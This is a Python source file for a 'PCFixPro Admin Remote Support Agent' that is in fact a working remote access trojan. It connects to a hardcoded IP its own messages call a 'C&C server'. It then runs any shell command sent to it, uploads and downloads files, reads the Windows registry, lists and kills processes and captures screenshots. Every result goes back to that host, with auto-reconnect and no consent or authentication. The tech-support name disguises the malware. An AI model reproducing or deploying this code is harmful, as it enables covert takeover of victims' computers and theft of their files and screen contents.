"""
PCFixPro Admin Remote Support Agent - Full System Access
Provides total PC access for effective service delivery
"""
import socketio
import requests
import socket
import json
import os
import platform
import subprocess
import threading
import time
from datetime import datetime
import base64
import io

# Configuration
SERVER_URL = "http://102.209.236.22:5000"
HOSTNAME = socket.gethostname()

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_system_info():
    """Collect comprehensive system information"""
    try:
        info = {
            "hostname": HOSTNAME,
            "ip_address": get_local_ip(),
            "os": f"{platform.system()} {platform.release()}",
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "agent_version": "2.0.0-admin",
            "status": "online",
            "last_seen": datetime.now().isoformat(),
            "admin_access": True
        }
        return info
    except Exception as e:
        print(f"Error getting system info: {e}")
        return {"hostname": HOSTNAME, "status": "online"}

def send_wol(mac_address):
    """Send Wake-on-LAN magic packet"""
    try:
        mac_bytes = bytes.fromhex(mac_address.replace(':', '').replace('-', ''))
        magic_packet = b'\xff' * 6 + mac_bytes * 16
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.sendto(magic_packet, ('<broadcast>', 9))
        sock.close()
        return True
    except Exception as e:
        print(f"WOL error: {e}")
        return False

class AdminAgent:
    def __init__(self):
        self.sio = socketio.Client()
        self.agent_id = None
        self.setup_socket_handlers()
        
    def setup_socket_handlers(self):
        @self.sio.event
        def connect():
            print(f"[ADMIN-AGENT] Connected to C&C server at {SERVER_URL}")
            sys_info = get_system_info()
            self.sio.emit('register_agent', sys_info)
            
        @self.sio.event
        def disconnect():
            print("[ADMIN-AGENT] Disconnected. Reconnecting...")
            
        @self.sio.event
        def registered(data):
            self.agent_id = data.get('agent_id')
            print(f"[ADMIN-AGENT] Registered with ID: {self.agent_id}")
            
        @self.sio.event
        def execute_command(data):
            """Execute command with admin privileges"""
            command = data.get('command')
            command_id = data.get('command_id')
            print(f"[ADMIN-AGENT] Executing: {command}")
            
            try:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                
                output = {
                    'command_id': command_id,
                    'output': (result.stdout or '') + (result.stderr or ''),
                    'return_code': result.returncode,
                    'timestamp': datetime.now().isoformat()
                }
                
                self.sio.emit('command_result', output)
            except Exception as e:
                self.sio.emit('command_result', {
                    'command_id': command_id,
                    'output': str(e),
                    'return_code': -1,
                    'timestamp': datetime.now().isoformat()
                })
        
        @self.sio.event
        def list_files(data):
            """List files with admin access"""
            path = data.get('path', 'C:\\')
            print(f"[ADMIN-AGENT] Listing files: {path}")
            
            try:
                entries = []
                for item in sorted(os.listdir(path)):
                    full_path = os.path.join(path, item)
                    try:
                        stat = os.stat(full_path)
                        entries.append({
                            'name': item,
                            'path': full_path,
                            'is_dir': os.path.isdir(full_path),
                            'size': stat.st_size if not os.path.isdir(full_path) else 0,
                            'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                        })
                    except:
                        pass
                
                self.sio.emit('file_list', {
                    'path': path,
                    'files': entries,
                    'command_id': data.get('command_id')
                })
            except Exception as e:
                self.sio.emit('file_list', {
                    'path': path,
                    'error': str(e),
                    'command_id': data.get('command_id')
                })
        
        @self.sio.event
        def upload_file(data):
            """Upload file to agent"""
            filename = data.get('filename')
            content_b64 = data.get('content')
            remote_path = data.get('path', 'C:\\')
            
            try:
                file_data = base64.b64decode(content_b64)
                full_path = os.path.join(remote_path, filename)
                
                with open(full_path, 'wb') as f:
                    f.write(file_data)
                
                self.sio.emit('upload_result', {
                    'status': 'success',
                    'filename': filename,
                    'path': full_path,
                    'size': len(file_data),
                    'command_id': data.get('command_id')
                })
            except Exception as e:
                self.sio.emit('upload_result', {
                    'status': 'error',
                    'error': str(e),
                    'command_id': data.get('command_id')
                })
        
        @self.sio.event
        def download_file(data):
            """Download file from agent"""
            file_path = data.get('path')
            
            try:
                with open(file_path, 'rb') as f:
                    content = f.read()
                
                content_b64 = base64.b64encode(content).decode('utf-8')
                
                self.sio.emit('download_result', {
                    'status': 'success',
                    'path': file_path,
                    'filename': os.path.basename(file_path),
                    'content': content_b64,
                    'size': len(content),
                    'command_id': data.get('command_id')
                })
            except Exception as e:
                self.sio.emit('download_result', {
                    'status': 'error',
                    'error': str(e),
                    'command_id': data.get('command_id')
                })
        
        @self.sio.event
        def read_registry(data):
            """Read Windows Registry"""
            hive = data.get('hive', 'HKLM')
            key_path = data.get('key_path')
            
            try:
                # Import winreg only on Windows
                if platform.system() != 'Windows':
                    raise Exception('Registry access only available on Windows')
                    
                import winreg
                if hive == 'HKLM':
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ)
                elif hive == 'HKCU':
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
                else:
                    raise Exception('Invalid hive')
                
                values = {}
                i = 0
                while True:
                    try:
                        name, value, type_ = winreg.EnumValue(key, i)
                        values[name] = str(value)
                        i += 1
                    except:
                        break
                
                winreg.CloseKey(key)
                
                self.sio.emit('registry_result', {
                    'status': 'success',
                    'hive': hive,
                    'key_path': key_path,
                    'values': values,
                    'command_id': data.get('command_id')
                })
            except Exception as e:
                self.sio.emit('registry_result', {
                    'status': 'error',
                    'error': str(e),
                    'command_id': data.get('command_id')
                })
        
        @self.sio.event
        def list_processes(data):
            """List running processes"""
            try:
                processes = []
                # Use psutil if available, otherwise fallback
                try:
                    import psutil
                    for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                        try:
                            processes.append({
                                'pid': proc.info['pid'],
                                'name': proc.info['name'],
                                'cpu': proc.info['cpu_percent'] or 0,
                                'memory': proc.info['memory_percent'] or 0
                            })
                        except:
                            pass
                except ImportError:
                    # Fallback without psutil
                    if platform.system() == 'Windows':
                        import wmi
                        c = wmi.WMI()
                        for proc in c.Win32_Process():
                            processes.append({
                                'pid': proc.ProcessId,
                                'name': proc.Name,
                                'cpu': 0,
                                'memory': getattr(proc, 'WorkingSetSize', 0) // 1024 // 1024
                            })
                    else:
                        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                        for line in result.stdout.split('\n')[1:]:
                            parts = line.split()
                            if len(parts) > 10:
                                processes.append({
                                    'pid': int(parts[1]),
                                    'name': parts[10],
                                    'cpu': float(parts[2]),
                                    'memory': float(parts[3])
                                })
                
                self.sio.emit('processes_result', {
                    'status': 'success',
                    'processes': processes[:50],
                    'command_id': data.get('command_id')
                })
            except Exception as e:
                self.sio.emit('processes_result', {
                    'status': 'error',
                    'error': str(e),
                    'command_id': data.get('command_id')
                })
        
        @self.sio.event
        def kill_process(data):
            """Kill a process"""
            pid = data.get('pid')
            
            try:
                try:
                    import psutil
                    proc = psutil.Process(pid)
                    proc.terminate()
                except ImportError:
                    # Fallback without psutil
                    if platform.system() == 'Windows':
                        subprocess.run(['taskkill', '/PID', str(pid), '/F'], capture_output=True)
                    else:
                        subprocess.run(['kill', '-9', str(pid)], capture_output=True)
                
                self.sio.emit('kill_result', {
                    'status': 'success',
                    'pid': pid,
                    'command_id': data.get('command_id')
                })
            except Exception as e:
                self.sio.emit('kill_result', {
                    'status': 'error',
                    'error': str(e),
                    'command_id': data.get('command_id')
                })
        
        @self.sio.event
        def wake_on_lan(data):
            """Send Wake-on-LAN packet"""
            mac_address = data.get('mac_address')
            
            success = send_wol(mac_address)
            
            self.sio.emit('wol_result', {
                'status': 'success' if success else 'error',
                'mac_address': mac_address,
                'message': 'Magic packet sent' if success else 'Failed to send WOL packet',
                'command_id': data.get('command_id')
            })
        
        @self.sio.event
        def screenshot(data):
            """Take screenshot"""
            try:
                from PIL import ImageGrab
                img = ImageGrab.grab()
                buffered = io.BytesIO()
                img.save(buffered, format="PNG")
                content_b64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
                
                self.sio.emit('screenshot_result', {
                    'status': 'success',
                    'content': content_b64,
                    'command_id': data.get('command_id')
                })
            except Exception as e:
                self.sio.emit('screenshot_result', {
                    'status': 'error',
                    'error': str(e),
                    'command_id': data.get('command_id')
                })
    
    def connect(self):
        """Connect to C&C server with auto-reconnect"""
        while True:
            try:
                if not self.sio.connected:
                    self.sio.connect(SERVER_URL, transports=['websocket', 'polling'])
                    
                    while self.sio.connected:
                        time.sleep(30)
                        if self.agent_id:
                            self.sio.emit('heartbeat', {'agent_id': self.agent_id})
            except Exception as e:
                print(f"[ADMIN-AGENT] Connection error: {e}. Reconnecting in 10s...")
                time.sleep(10)
    
    def run(self):
        """Start the admin agent"""
        print(f"[ADMIN-AGENT] Starting Admin Remote Support Agent...")
        print(f"[ADMIN-AGENT] Hostname: {HOSTNAME}")
        print(f"[ADMIN-AGENT] Local IP: {get_local_ip()}")
        print(f"[ADMIN-AGENT] Connecting to: {SERVER_URL}")
        
        self.connect()

if __name__ == "__main__":
    agent = AdminAgent()
    agent.run()